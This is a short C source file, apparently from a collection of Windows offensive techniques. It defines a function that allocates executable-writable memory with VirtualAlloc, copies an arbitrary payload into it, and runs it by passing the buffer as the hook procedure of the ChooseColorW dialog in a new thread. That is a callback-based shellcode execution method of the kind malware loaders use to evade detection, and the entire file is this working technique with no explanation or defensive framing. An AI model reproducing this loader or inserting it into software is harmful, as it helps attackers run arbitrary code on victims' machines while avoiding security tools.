#include "Win32Helper.h"

VOID InvokeChooseColorWCallbackRoutine(LPVOID lpParameter)
{
	CHOOSECOLORW Color = { 0 };
	Color.lStructSize = sizeof(CHOOSECOLORW);
	Color.Flags = CC_ENABLEHOOK;
	Color.lpfnHook = (LPCCHOOKPROC)lpParameter;

	ChooseColorW(&Color);
}

BOOL MpfSceViaChooseColorW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeChooseColorWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}